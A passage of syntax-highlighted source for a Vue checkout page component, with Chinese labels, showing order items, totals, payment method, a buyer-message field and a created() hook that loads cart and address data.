#808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right-icon"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/address/manage'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"arrow"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 订单明细 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goods-item"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_image</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"right"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tit text-ellipsis-2"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              {{ </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_name</span><span style="color: #D4D4D4"> }}</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">p</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"count"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">共{{ </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4"> }}件</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"price"</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">¥{{ </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_price_min</span><span style="color: #D4D4D4"> * </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_num</span><span style="color: #D4D4D4"> }}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">p</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"flow-num-box"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">共 {{ </span><span style="color: #DCDCAA">selectedCartCount</span><span style="color: #D4D4D4">() }} 件商品，合计：</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"money"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">￥{{ </span><span style="color: #DCDCAA">selectedPrice</span><span style="color: #D4D4D4">() }}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-detail"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-cell"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">订单总金额：</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"red"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">￥{{ </span><span style="color: #DCDCAA">selectedPrice</span><span style="color: #D4D4D4">() }}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-cell"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">优惠券：</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">无优惠券可用</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-cell"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">配送费用：</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">请先选择配送地址</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-else</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"red"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">+￥0.00</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">&lt;!-- 支付方式 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-way"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tit"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">支付方式</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"pay-cell"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&gt;&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"balance-o"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">余额支付（可用 ¥ 999919.00 元）</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">&lt;!-- &lt;span&gt;请先选择配送地址&lt;/span&gt; --&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"red"</span><span style="color: #808080">&gt;&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"passed"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">&lt;!-- 买家留言 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"buytips"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">textarea</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"选填：买家留言（50字内）"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">id</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">cols</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"30"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">rows</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"10"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">textarea</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 底部提交 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"footer-fixed"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"left"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        实付款：</span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">￥{{ </span><span style="color: #DCDCAA">selectedPrice</span><span style="color: #D4D4D4">() }}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tipsbtn"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/order/confirm'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        提交订单</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">mapActions</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">mapGetters</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vuex"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"PayIndex"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 构建地区映射表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">buildReverseMaps</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 处理购物车详情展示</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 拉取购物车列表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getCartAction</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">selectedCartList</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"购物车列表："</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartList</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取地址列表</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">list</span><span style="color: #D4D4D4"> } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getAddressList</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressList</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">list</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"地址列表："</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressList</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 从Vuex中获取默认地址的id</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">defaultAddressId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getDefaultAddressId</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"默认地址id："</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">length</span><span style="color: #D4D4D4"> &gt; </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 如果有地址查询参数?adsid，则说明进行了地址切换</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"地址切换参数："</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getadsid</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getadsid</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// chosenAddress被赋值为切换的id的地址</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">address</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">find</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">          (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">String</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">address_id</span><span style="color: #D4D4D4">) === </span><span style="color: #DCDCAA">String</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getadsid</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">        );</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">chosenAddress</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">address</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"切换后的地址："</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">chosenAddress</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 如果没有地址切换参数，则说明没有切换地址</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4">) !== -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// 遍历比对列表每一项的id是否与defaultAddressId相等，找到后返回索引（强等于比较，注意类型）</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">defaultIndex</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">findIndex</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">            (</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">String</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">address_id</span><span style="color: #D4D4D4">) === </span><span style="color: #DCDCAA">String</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">defaultAddressId</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">          );</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// console.log('默认地址索引：', defaultIndex)</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">Number</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">defaultIndex</span><span style="color: #D4D4D4">) !== -</span><span style="color: #B5CEA8">1</span><span 